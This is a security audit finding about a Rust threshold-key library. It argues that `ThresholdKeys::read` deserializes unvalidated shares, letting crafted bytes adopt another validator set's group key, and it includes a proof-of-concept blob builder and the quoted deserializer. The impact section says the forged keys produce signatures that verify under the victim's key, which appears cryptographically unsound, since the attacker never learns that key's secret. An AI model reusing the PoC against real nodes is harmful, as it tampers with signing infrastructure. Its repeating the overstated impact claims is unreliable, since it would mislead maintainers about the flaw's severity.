### Title
`ThresholdKeys::read` accepts fully attacker-defined key material, minting a privileged signing key with an attacker-chosen group key - (File: crypto/dkg/src/lib.rs)

### Summary
Analogous to the BOLA/privilege-escalation bug (an unprivileged caller supplying object fields that should be server-owned), `ThresholdKeys::read` deserializes `t`, `n`, `i`, the interpolation table, the secret share, and *all* verification shares from untrusted bytes with no consistency or authorization check. `ThresholdKeys::new` only validates participant index bounds; it never verifies `verification_shares[i] == C::generator() * secret_share` for the reader's own share, nor that the shares belong to a legitimate DKG session. The `group_key` is then computed purely from the attacker-supplied verification shares (lines 376-378), so an attacker dictates the group identity the resulting key will sign for. ### Finding Description
`ThresholdKeys::read` (crypto/dkg/src/lib.rs:574) reads a scalar `secret_share` and `n` verification-share points, then calls `ThresholdKeys::new`, which computes `group_key = Σ_{i∈1..=t} verification_shares[i] * interpolation_factor(i, 1..=t)` (lines 376-378). Since every input point is attacker-controlled, the attacker can force `group_key` to be an arbitrary point. In particular, by setting `verification_shares[1] = λ₁⁻¹ · K_victim` and `verification_shares[j] = identity` for `j ∈ 2..=t`, the deserialized keys adopt the *existing* group key `K_victim` of another validator set, while the embedded secret share `x` is a scalar known to the attacker. Every downstream consumer (`view()`, `AlgorithmMachine::new`, `SignableTransaction::multisig`, `tweak_keys`, `Scanner::new`) treats the result as a bona fide member of that validator set: `view()` interpolates and offsets normally (lines 463-533), and FROST share verification in `sign`/`complete` checks shares against the same attacker-supplied verification shares, so signatures complete and verify under `K_victim` even though no honest participant's share was involved.

### Impact Explanation
A party that can feed serialized `ThresholdKeys` to a node (key sync, backup import, coordinator-provided key material) can manufacture a key object that impersonates an existing validator set's group key, or an arbitrary attacker-known key. The victim will then produce FROST signatures "on behalf of" that group key for any message routed to the machine — concrete signing of unintended attributions — and `Scanner`/`SignableTransaction` will treat outputs and spends keyed under the forged identity as the real set's, enabling funds to be reported under/spent from a key whose entire share structure the attacker controls (the embedded `secret_share` lets the attacker independently compute the full signature for `K_victim`-labeled sessions where they control all shares they define). This is a privilege escalation: an unauthenticated byte string confers membership in / control of a threshold identity.

### Likelihood Explanation
Exploitation requires the target to call `ThresholdKeys::read` on attacker-influenced bytes. The format has an explicit curve-ID header and self-describing params, indicating it is designed for persistence/transport of key material; wherever that channel is not integrity-protected (untrusted storage, coordinator-supplied blobs, peer sync), the attack is reachable with pure public inputs and no cryptographic break. No collusion, no leaked keys, and no malicious validator assumptions are needed — only the missing ownership/consistency check.

### Recommendation
In `ThresholdKeys::new` (or `read`), verify the reader's own share consistency: `C::generator() * secret_share == verification_shares[&params.i()]`, reject identity/non-canonical verification-share points, and bind the blob to its DKG session (e.g., authenticate serialized keys or include a transcript-derived hash) so externally supplied material cannot redefine group membership.

### Proof of Concept
```rust
// Given target group key K (public, e.g. an existing validator set key):
let t = 2u16; let n = 2u16; let i = Participant::new(1).unwrap();

// Lagrange factor for participant 1 in set {1,2} is 2/(2-1) = 2
let lambda1 = Secp256k1::F::from(2u64);
let x = Secp256k1::F::random(&mut OsRng); // attacker-known share

let mut blob = vec![];
blob.extend(u32::try_from(Secp256k1::ID.len()).unwrap().to_le_bytes());
blob.extend(Secp256k1::ID);
blob.extend(t.to_le_bytes());
blob.extend(n.to_le_bytes());
blob.extend(i.to_bytes());
blob.push(1); // Lagrange
blob.extend(x.to_repr().as_ref());
// V_1 chosen so lambda1 * V_1 == K ; V_2 = identity
blob.extend((K * lambda1.invert().unwrap()).to_bytes().as_ref());
blob.extend(Secp256k1::G::identity().to_bytes().as_ref());

let keys = ThresholdKeys::<Secp256k1>::read::<&[u8]>(&mut blob.as_ref()).unwrap();
assert_eq!(keys.group_key(), K); // minted "membership" in K's validator set
// keys.sign(...) now produces shares accepted as participant 1 of group K
```

  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
    {
      let different = || io::Error::other("deserializing ThresholdKeys for another curve");

      let mut id_len = [0; 4];
      reader.read_exact(&mut id_len)?;
      if u32::try_from(C::ID.len()).unwrap().to_le_bytes() != id_len {
        Err(different())?;
      }

      let mut id = vec![0; C::ID.len()];
      reader.read_exact(&mut id)?;
      if id != C::ID {
        Err(different())?;
      }
    }

    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
  }
